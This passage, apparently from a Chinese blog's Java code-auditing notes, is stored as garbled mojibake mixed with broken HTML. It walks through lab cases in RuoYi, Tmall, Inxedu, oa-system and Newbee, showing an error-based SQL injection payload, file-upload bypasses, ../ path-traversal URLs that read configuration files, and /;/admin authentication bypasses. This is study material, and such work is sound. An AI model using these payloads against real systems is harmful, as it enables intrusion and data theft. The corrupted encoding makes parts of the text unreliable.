å¯»æ‰¾baseKeyçš„å®ç°ï¼Œç¡®å®šè·¯ç”±ä¸º(/informlistpaging)<br><br>  ![](/img/javaå®¡è®¡/javaå®¡è®¡<span class="hljs-number">04.</span>png)<br><br>- æ‰¾åˆ°è·¯ç”±åè®¿é—®æŠ“å–æ•°æ®åŒ…ï¼Œä½¿ç”¨sqlmapæµ‹è¯•payload<br><br>#### RuoYiæ¡ˆä¾‹<br><br>- åœ¨æºç ç®€ä»‹å¤„å‘ç°ä½¿ç”¨çš„Mybatisæ¡†æ¶<br><br>- æœç´¢å…³é”®å­—$&#123;<br><br>- æ‰¾åˆ°å¯èƒ½å­˜åœ¨ä¸å®‰å…¨å†™æ³•çš„åœ°æ–¹(ç­›é€‰å‡ºå¯èƒ½çš„æ³¨å…¥ç‚¹ï¼Œå¯æ‰§è¡Œsqlè¯­å¥)<br><br>  ![](/img/javaå®¡è®¡/javaå®¡è®¡<span class="hljs-number">05.</span>png)<br><br>  è¿½è¸ªupdateDeptStatusçš„ç”¨æ³•<br><br>- å…¨å±€æœç´¢updateDeptStatuså…³é”®å­—é€ä¸ªæŸ¥æ‰¾ç”¨æ³•(å¯»æ‰¾è·¯ç”±å…³ç³»)<br><br>- ç›´æ¥æœç´¢updateDeptStatuså…³é”®å­—å‘ç°æ­¤å…³é”®å­—å‡ºç°åœ¨serviceå±‚ä¸­<br><br>  - åŸºäºspringbootä¸­ï¼Œæ‰§è¡Œsqlè¯­å¥çš„ä¸‰ä¸ªè°ƒç”¨<br>    - ä¸šåŠ¡å±‚è°ƒç”¨Daoå±‚<br>    - controllerè°ƒç”¨serviceå±‚é—´æ¥è°ƒç”¨Daoå±‚<br>    - controllerç›´æ¥è°ƒç”¨Daoå±‚<br>  - è·¯ç”±å…³ç³»ä¸€èˆ¬å†™åœ¨controllerä¸­<br><br>- é€‰ä¸­updateDeptStatuså…³é”®å­—ï¼Œç‚¹å‡»æŸ¥æ‰¾ç”¨æ³•ï¼Œå‘ç°updateDeptè°ƒç”¨äº†æ­¤æ–¹æ³•ï¼Œç»§ç»­è¿½è¸ªæ­¤æ–¹æ³•ï¼Œæ‰¾åˆ°SysDeptControlleræ–‡ä»¶ä¸­æœ‰è°ƒç”¨updateDeptæ–¹æ³•ï¼Œ<br><br>  é¡ºåˆ©æ‰¾åˆ°è·¯ç”±å…³ç³»<br><br>  $&#123;-&gt;updateDeptStatus-&gt;updateParentDeptStatus-&gt;updateDept-&gt;/system/dept/edit<br><br>- æµ‹è¯•payload<br><br>  - ç›´æ¥è®¿é—®urlåœ°å€å‘ç°æŠ¥é”™<br><br>  - æ ¹æ®ä¸­æ–‡æ³¨é‡Šæ‰¾åˆ°åŠŸèƒ½ç‚¹æŠ“å–æ•°æ®åŒ…ï¼ŒæˆåŠŸæ‰¾åˆ°/system/dept/editè·¯ç”±çš„æ•°æ®<br><br>  - å‘ç°æ•°æ®åŒ…ä¸­æ²¡æœ‰æ³¨å…¥å‚æ•°å€¼ï¼Œå°è¯•æ‰‹åŠ¨æ·»åŠ <br><br>  - ä½¿ç”¨sqlmapæ— æ³•æˆåŠŸæ³¨å…¥ï¼Œä½¿ç”¨æ‰‹å·¥æ³¨å…¥<br><br>  - ```java<br>    DeptName=<span class="hljs-number">1</span>&amp;DeptId=<span class="hljs-number">100</span>&amp;ParentId=<span class="hljs-number">12</span>&amp;&amp;status=<span class="hljs-number">0</span>&amp;OrderNum=<span class="hljs-number">1</span>&amp;ancestors=<span class="hljs-number">0</span>)or(extractvalue(<span class="hljs-number">1</span>,concat((select <span class="hljs-title function_">user</span><span class="hljs-params">()</span>))));#<br></code></pre></td></tr></table></figure></p><ul><li>ä½¿ç”¨æ‹¬å·ç»•è¿‡ç©ºæ ¼è¿‡æ»¤</li></ul><h3 id="æ–‡ä»¶å®‰å…¨"><a href="#æ–‡ä»¶å®‰å…¨" class="headerlink" title="æ–‡ä»¶å®‰å…¨"></a>æ–‡ä»¶å®‰å…¨</h3><p><a href="https://blog.csdn.net/god_zzZ/article/details/108104523">Javaä»£ç å®¡è®¡ï¼šæ–‡ä»¶ç¯‡&#x2F;æ–‡ä»¶ä¸Šä¼ &#x2F;æ–‡ä»¶è¯»å–&#x2F;ç›®å½•éå†_æ½œåœ¨è·¯å¾„éå†(æ–‡ä»¶è¯»å–) æ‰“å¼€æ–‡ä»¶ä»¥è¯»å–å…¶å†…å®¹ã€‚æ–‡ä»¶åæ¥è‡ªè¾“å…¥å‚æ•°ã€‚å¦‚æœå°†æœªè¿‡-CSDNåšå®¢</a></p><ul><li><p>å…³é”®å­—æŸ¥è¯¢</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A106.png"></p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A107.png"></p></li></ul><h4 id="Inxeduæ¡ˆä¾‹-å‰å°æ–‡ä»¶ä¸Šä¼ "><a href="#Inxeduæ¡ˆä¾‹-å‰å°æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="Inxeduæ¡ˆä¾‹(å‰å°æ–‡ä»¶ä¸Šä¼ )"></a>Inxeduæ¡ˆä¾‹(å‰å°æ–‡ä»¶ä¸Šä¼ )</h4><ul><li><p>æ­å»ºç½‘ç«™åç›´æ¥å¯»æ‰¾åŠŸèƒ½ç‚¹ï¼Œå‘ç°æœ‰æ–‡ä»¶ä¸Šä¼ </p></li><li><p>å°è¯•ä¸Šä¼ æ–‡ä»¶æ‰¾åˆ°è·¯ç”±</p></li><li><p>æ­¤ç½‘ç«™æºç å°†æ–‡ä»¶å®‰å…¨ä»£ç å°è£…åœ¨jaråŒ…ä¸­ï¼Œ&#x2F;UploadController.classï¼Œéœ€è¦é€šè¯»ç›®å½•ï¼Œç†æ¸…ç»“æ„æ‰èƒ½æ‰¾åˆ°</p></li><li><p>æ ¹æ®ä¸Šä¼ æ–‡ä»¶æ—¶æ‰¾åˆ°çš„è·¯ç”±ï¼Œç¡®å®šæ§åˆ¶ä»£ç </p></li><li><p>å‘ç°æ˜¯é»‘åå•è¿‡æ»¤ï¼Œåªè¿‡æ»¤jspæ–‡ä»¶</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A108.png"></p></li><li><p>ä½¿ç”¨å·¥å…·ç”Ÿæˆjspxæ–‡ä»¶ï¼Œä¿®æ”¹å‰ç«¯ç™½åå•è¿‡æ»¤ä»£ç ï¼ŒæˆåŠŸä¸Šä¼ </p></li></ul><h4 id="Tmallæ¡ˆä¾‹"><a href="#Tmallæ¡ˆä¾‹" class="headerlink" title="Tmallæ¡ˆä¾‹"></a>Tmallæ¡ˆä¾‹</h4><h5 id="åå°æ–‡ä»¶ä¸Šä¼ "><a href="#åå°æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="åå°æ–‡ä»¶ä¸Šä¼ "></a>åå°æ–‡ä»¶ä¸Šä¼ </h5><ul><li><p>æœç´¢æ–‡ä»¶å®‰å…¨ç›¸å…³å…³é”®å­—</p></li><li><p>æœç´¢new Fileï¼Œæ‰¾åˆ°æ–‡ä»¶ä¸Šä¼ ç›¸å…³ä»£ç </p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A109.png"></p><p>æ–‡ä»¶ä¸Šä¼ è¿‡æ»¤ä¸€èˆ¬å…³æ³¨åç¼€ï¼Œæ‰€ä»¥åœ¨æ­¤æ®µä»£ç ä¸­åº”è¯¥å…³æ³¨æ–‡ä»¶ååç¼€æ˜¯å¦‚ä½•è·å–çš„</p><p>å‘ç°è¿™æ®µä»£ç æ˜¯ç›´æ¥è·å–äº†åŸæ–‡ä»¶åç¼€åå¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œè€Œæ˜¯ç›´æ¥ä¸Šä¼ äº†</p></li><li><p>å¼€å§‹æµ‹è¯•ï¼Œå‘ç°æœ‰å‰ç«¯éªŒè¯ï¼ŒæŠ“åŒ…åæ›´æ”¹åç¼€ä¸ºjspå¯ä»¥æ­£å¸¸ä¸Šä¼ </p></li></ul><h5 id="è¿‡æ»¤å™¨é‰´æƒ"><a href="#è¿‡æ»¤å™¨é‰´æƒ" class="headerlink" title="è¿‡æ»¤å™¨é‰´æƒ"></a>è¿‡æ»¤å™¨é‰´æƒ</h5><ul><li><p>æ‰¾åˆ°è¿‡æ»¤å™¨æ ¸å¿ƒä»£ç AdminPermissionFilterç±»</p></li><li><p>æ‰¾åˆ°æ ¸å¿ƒæ§åˆ¶æ–¹æ³•doFilter</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A110.png"></p><p>å‘ç°é‰´æƒå­˜åœ¨äº†æ¼æ´ï¼Œå®¹æ˜“è¶Šæƒ</p></li><li><p>è¿›è¡Œæµ‹è¯•</p><ul><li>åœ¨æ•°æ®åŒ…urlä¸­åŠ ä¸Š &#x2F;admin&#x2F;login&#x2F;..&#x2F;..&#x2F;</li><li>æˆåŠŸç»•è¿‡é‰´æƒ</li></ul></li></ul><h4 id="RuoYi-4-5-0-æ–‡ä»¶ä¸‹è½½"><a href="#RuoYi-4-5-0-æ–‡ä»¶ä¸‹è½½" class="headerlink" title="RuoYi-4.5.0(æ–‡ä»¶ä¸‹è½½)"></a>RuoYi-4.5.0(æ–‡ä»¶ä¸‹è½½)</h4><ul><li><p>æœç´¢å…³é”®å­—new FileInputStream</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A111.png"></p><p>æ‰¾åˆ°è¿™æ®µç›¸å…³ä»£ç æ§åˆ¶å­—èŠ‚è¾“å‡ºï¼Œä½†æ˜¯å‘ç°è¿™ä¸ªç±»ä¸­æ²¡æœ‰è·¯ç”±å…³ç³»ï¼Œä¸èƒ½ç›´æ¥è§¦å‘æ­¤æ¼æ´</p></li><li><p>å°è¯•æŸ¥æ‰¾æ˜¯å¦æœ‰ç”¨è¿‡writeBytesæ–¹æ³•</p></li><li><p>æŸ¥æ‰¾ç”¨æ³•åå‘ç°ï¼ŒCommonControllerç±»ä¸­fileDownloadæ–¹æ³•å’ŒresourceDownloadæ–¹æ³•è°ƒç”¨äº†æ­¤æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>            <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-comment">// æœ¬åœ°èµ„æºè·¯å¾„</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> Global.getProfile();<br>        <span class="hljs-comment">// æ•°æ®åº“èµ„æºåœ°å€</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>        <span class="hljs-comment">// ä¸‹è½½åç§°</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br><br>        response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>        FileUtils.setAttachmentResponseHeader(response, downloadName);<br><br>        FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰“å°å‡ºlocalPathä¸downloadPathçš„å€¼æŸ¥çœ‹resourceå‚æ•°æ˜¯å¦‚ä½•æ„æˆçš„</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A112.png"></p><p>ä»£ç é‡Šä¹‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * èµ„æºæ–‡ä»¶ä¸‹è½½æ¥å£</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> resource èµ„æºè·¯å¾„å‚æ•°ï¼ˆåŒ…å«èµ„æºæ ‡è¯†ç¬¦ï¼‰</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request HTTPè¯·æ±‚å¯¹è±¡</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response HTTPå“åº”å¯¹è±¡</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> Exception å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span>  <span class="hljs-comment">// å®šä¹‰GETè¯·æ±‚æ˜ å°„è·¯å¾„</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-comment">// è·å–æœ¬åœ°èµ„æºå­˜å‚¨çš„åŸºç¡€è·¯å¾„ï¼ˆä¾‹å¦‚ï¼šD:/upload/ï¼‰</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> Global.getProfile();<br>    <br>    <span class="hljs-comment">// ä»resourceå‚æ•°ä¸­æˆªå–èµ„æºç›¸å¯¹è·¯å¾„ï¼Œå¹¶æ‹¼æ¥æˆå®Œæ•´ç‰©ç†è·¯å¾„</span><br>    <span class="hljs-comment">// ä¾‹å¦‚ï¼šresource=&quot;profile/xxx.jpg&quot; â†’ æˆªå–åå˜æˆ&quot;/xxx.jpg&quot; â†’ æœ€ç»ˆè·¯å¾„&quot;D:/upload/xxx.jpg&quot;</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>    <br>    <span class="hljs-comment">// ä»å®Œæ•´è·¯å¾„ä¸­æå–æ–‡ä»¶åï¼ˆæœ€åä¸€ä¸ª/åçš„å†…å®¹ï¼‰</span><br>    <span class="hljs-comment">// ä¾‹å¦‚ï¼š&quot;D:/upload/xxx.jpg&quot; â†’ &quot;xxx.jpg&quot;</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br><br>    <span class="hljs-comment">// è®¾ç½®å“åº”å†…å®¹ç±»å‹ä¸ºäºŒè¿›åˆ¶æµï¼ˆå¼ºåˆ¶æµè§ˆå™¨ä¸‹è½½è€Œä¸æ˜¯ç›´æ¥æ‰“å¼€ï¼‰</span><br>    response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>    <br>    <span class="hljs-comment">// è®¾ç½®å“åº”å¤´ï¼ŒæŒ‡å®šä¸‹è½½æ–‡ä»¶åï¼ˆè§£å†³ä¸­æ–‡ä¹±ç ç­‰é—®é¢˜ï¼‰</span><br>    FileUtils.setAttachmentResponseHeader(response, downloadName);<br><br>    <span class="hljs-comment">// å°†æ–‡ä»¶å†…å®¹å†™å…¥å“åº”è¾“å‡ºæµï¼ˆå®ç°ä¸‹è½½ï¼‰</span><br>    FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>&#125;<br></code></pre></td></tr></table></figure><p>localPathæ˜¯å¼€å‘äººå‘˜è‡ªå·±è®¾ç½®çš„æºä»£ç è·¯å¾„ï¼Œå‘ç°æ²¡æœ‰è¿‡æ»¤..&#x2F;</p></li><li><p>æ„é€ payload(å®æˆ˜ä¸­è¦çŒœæµ‹æ–‡ä»¶æ‰€å¤„çš„ä½ç½®ï¼Œæ–‡ä»¶å¤¹åç§°)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8088//common/download/resource?resource=/profile/../RuoYi-v4.5.0/ruoyi-admin/src/main/resources/application-druid.yml<br></code></pre></td></tr></table></figure></li><li><p>åœ¨v4.6.0ç‰ˆæœ¬ä¸­çš„åŒæ ·ä½ç½®æ‰¾åˆ°æ–°ç‰ˆæœ¬ä¿®å¤äº†æ­¤æ¼æ´ï¼Œè¿‡æ»¤äº†..&#x2F;ï¼Œå¤šäº†æ£€æµ‹è§„åˆ™</p></li></ul><h4 id="oa-system-masteræ¡ˆä¾‹-æ–‡ä»¶è¯»å–"><a href="#oa-system-masteræ¡ˆä¾‹-æ–‡ä»¶è¯»å–" class="headerlink" title="oa-system-masteræ¡ˆä¾‹(æ–‡ä»¶è¯»å–)"></a>oa-system-masteræ¡ˆä¾‹(æ–‡ä»¶è¯»å–)</h4><ul><li><p>æœç´¢å…³é”®å­—FileInputStream</p><p>æ‰¾åˆ°ä¸€æ®µç›¸å…³ä»£ç ï¼Œå¼€å§‹å®¡è®¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;//**&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> /(Model model, HttpServletResponse response, <span class="hljs-meta">@SessionAttribute(&quot;userId&quot;)</span> Long userId, HttpServletRequest request)<br><span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">projectPath</span> <span class="hljs-operator">=</span> ClassUtils.getDefaultClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>).getPath();<br>System.out.println(projectPath);<br><span class="hljs-type">String</span> <span class="hljs-variable">startpath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(URLDecoder.decode(request.getRequestURI(), <span class="hljs-string">&quot;utf-8&quot;</span>));<br><br><span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> startpath.replace(<span class="hljs-string">&quot;//&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-type">File</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(rootpath, path);<br><br><span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">sos</span> <span class="hljs-operator">=</span> response.getOutputStream();<br><span class="hljs-type">FileInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(f.getPath());<br><span class="hljs-type">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>) f.length()];<br>IOUtils.readFully(input, data);<br><span class="hljs-comment">// å°†æ–‡ä»¶æµè¾“å‡ºåˆ°æµè§ˆå™¨</span><br>IOUtils.write(data, sos);<br>input.close();<br>sos.close();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯»æ‡‚ä¸€æ®µä»£ç ï¼šä»ä¸‹åˆ°ä¸Šè¿½è¸ªï¼Œæ‰¾åˆ°å˜é‡çš„ä¼ é€’ä¸å‡½æ•°ä¹‹é—´çš„å…³ç³»ï¼Œç†æ¸…ä»£ç å³å¯å¤§è‡´è¯»æ‡‚</p></li><li><p>æ‰“å°å‡ºæ¯ä¸ªè¿‡ç¨‹å‚æ•°çš„å€¼é€ä¸ªåˆ†æ</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A113.png"></p></li><li><p>å‘ç°ä¼ å…¥çš„å€¼æ˜¯rootpathä¸pathçš„å€¼çš„æ‹¼æ¥</p></li><li><p>æ„é€ payloadï¼š</p><ul><li><p>åŒæ ·æ˜¯ä½¿ç”¨..&#x2F;è·³åˆ°ä¸Šä¸€çº§çš„åŸç†</p></li><li><pre><code class="language-url">/////..///..///..///..///..//1.txt<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>  - æ ¹æ®æºä»£ç ï¼Œ<span class="hljs-comment">//ä¼šè¢«æ›¿æ¢ä¸ºç©º</span><br><br>  - åªæœ‰urlä¸­åŠ ä¸Š<span class="hljs-comment">//æ‰èƒ½æ­£å¸¸æ‰§è¡Œï¼Œå…·ä½“åŸå› æœªçŸ¥</span><br><br><span class="hljs-meta">### é‰´æƒ æœªæˆæƒè®¿é—®</span><br><br>[<span class="hljs-meta">Javaä»£ç å®¡è®¡&amp;é‰´æƒæ¼æ´&amp;Interceptor&amp;Filter&amp;Shiro&amp;JWT_javaé‰´æƒ-CSDNåšå®¢</span>](https:<span class="hljs-comment">//blog.csdn.net/qq_46081990/article/details/135207986)</span><br><br><span class="hljs-number">1.</span> è¿‡æ»¤å™¨               -- é€»è¾‘å®‰å…¨é—®é¢˜<br><span class="hljs-number">2.</span> è‡ªå®šä¹‰ä»£ç        -- é€»è¾‘å®‰å…¨é—®é¢˜<br><span class="hljs-number">3.</span> shiroæ¡†æ¶éªŒè¯  -- æ‰¾shiroç‰ˆæœ¬æ¼æ´<br><br>- é‰´æƒä½¿ç”¨çš„æ¡†æ¶ï¼Œæ‹¦æˆªå™¨ï¼Œè¿‡æ»¤å™¨ç­‰<br><br>  ![](/img/javaå®¡è®¡/javaå®¡è®¡<span class="hljs-number">14.</span>png)<br>  <br>  æ‹¦æˆªå™¨ä¸€èˆ¬æµç¨‹<br>  <br>  ![](/img/javaå®¡è®¡/javaå®¡è®¡<span class="hljs-number">15.</span>png)<br><br><span class="hljs-meta">#### æŒ–æ˜ç‚¹</span><br><br><span class="hljs-number">1.</span> æ‹¦æˆªå™¨ä¸­æ˜¯å¦é‰´æƒ<br><span class="hljs-number">2.</span> è¿‡æ»¤å™¨ä¸­æ˜¯å¦é‰´æƒ<br><span class="hljs-number">3.</span> Shiroç‰ˆæœ¬åŠå…¶é€»è¾‘é…ç½®<br><span class="hljs-number">4.</span> æœ‰æ— JWT<br><span class="hljs-number">5.</span> ä»¥ä¸Šéƒ½æ²¡æœ‰ï¼ŒæŸ¥æ‰¾æ˜¯å¦æ˜¯è‡ªå†™ä»£ç é‰´æƒ<br><br><span class="hljs-meta">#### Newbeeæ¡ˆä¾‹(æ‹¦æˆªå™¨)</span><br><br>- ç¡®å®šé‰´æƒä½¿ç”¨çš„æ˜¯å“ªç§æ¨¡å¼<br>  - åœ¨pom.xmlæ–‡ä»¶ä¸­æœç´¢jwtå’Œshiroå…³é”®å­—ï¼Œå‘ç°å¹¶æ²¡æœ‰è¿™ä¸¤ç§ä¾èµ–çš„å¯¼å…¥<br>  - ç»§ç»­é€šè¿‡ç¿»çœ‹ç›®å½•ç¡®å®šæ˜¯è¿‡æ»¤å™¨è¿˜æ˜¯æ‹¦æˆªå™¨<br>  - ç¿»çœ‹è¿‡ç¨‹ä¸­å‘ç°æœ‰intercepetorç›®å½•<br>  <br>- ç¡®å®šä½¿ç”¨æ‹¦æˆªå™¨é‰´æƒ<br><br>- æ‹¦æˆªå™¨é‰´æƒä¸€èˆ¬å†™åœ¨preHandleæ–¹æ³•å†…<br><br>  ```<span class="hljs-function">java</span><br><span class="hljs-function">  <span class="hljs-keyword">public</span> boolean <span class="hljs-title">preHandle</span>(<span class="hljs-params">HttpServletRequest request, HttpServletResponse response, Object o</span>) throws Exception</span> &#123;<br>      <span class="hljs-comment">// è·å–å½“å‰è¯·æ±‚çš„è·¯å¾„</span><br>      String requestServletPath = request.getServletPath();<br>      <br>      <span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚è·¯å¾„æ˜¯å¦ä»¥&quot;/admin&quot;å¼€å¤´ä¸”ä¼šè¯ä¸­æ²¡æœ‰&quot;loginUser&quot;å±æ€§ï¼ˆå³ç”¨æˆ·æœªç™»å½•ï¼‰</span><br>      <span class="hljs-keyword">if</span> (requestServletPath.startsWith(<span class="hljs-string">&quot;/admin&quot;</span>) &amp;&amp; <span class="hljs-literal">null</span> == request.getSession().getAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>)) &#123;<br>          <span class="hljs-comment">// è®¾ç½®é”™è¯¯æ¶ˆæ¯åˆ°ä¼šè¯ä¸­</span><br>          request.getSession().setAttribute(<span class="hljs-string">&quot;errorMsg&quot;</span>, <span class="hljs-string">&quot;è¯·ç™»é™†&quot;</span>);<br>          <span class="hljs-comment">// é‡å®šå‘åˆ°ç®¡ç†å‘˜ç™»å½•é¡µé¢</span><br>          response.sendRedirect(request.getContextPath() + <span class="hljs-string">&quot;/admin/login&quot;</span>);<br>          <span class="hljs-comment">// è¿”å›falseè¡¨ç¤ºä¸­æ–­è¯·æ±‚ç»§ç»­æ‰§è¡Œ</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// å¦‚æœå·²ç™»å½•æˆ–éadminè·¯å¾„è¯·æ±‚ï¼Œåˆ™æ¸…é™¤å¯èƒ½çš„é”™è¯¯æ¶ˆæ¯</span><br>          request.getSession().removeAttribute(<span class="hljs-string">&quot;errorMsg&quot;</span>);<br>          <span class="hljs-comment">// è¿”å›trueå…è®¸è¯·æ±‚ç»§ç»­æ‰§è¡Œ</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul><p>æ ¸å¿ƒåˆ¤æ–­è¯­å¥requestServletPath.startsWith(â€œ&#x2F;adminâ€) &amp;&amp; null </p><p>è·¯å¾„å¼€å¤´ä»¥adminå¼€å¤´ï¼Œå¹¶ä¸”sessionä¸­loginUserä¸ºnull</p></li><li><p>åˆ©ç”¨æ–¹å¼ï¼šæ„é€ è·¯å¾„ä¸º&#x2F;;&#x2F;adminæˆ–&#x2F;&#x2F;adminåè®¿é—®</p></li><li><p>å®æ“å‘ç°é¡µé¢æ˜¾ç¤º404ï¼ŒçŒœæµ‹æ˜¯ä¸æµè§ˆå™¨æœ‰å…³</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A116.png"></p></li></ul><h4 id="åå¤ERPæ¡ˆä¾‹-è¿‡æ»¤å™¨"><a href="#åå¤ERPæ¡ˆä¾‹-è¿‡æ»¤å™¨" class="headerlink" title="åå¤ERPæ¡ˆä¾‹(è¿‡æ»¤å™¨)"></a>åå¤ERPæ¡ˆä¾‹(è¿‡æ»¤å™¨)</h4><ul><li><p>åŒæ 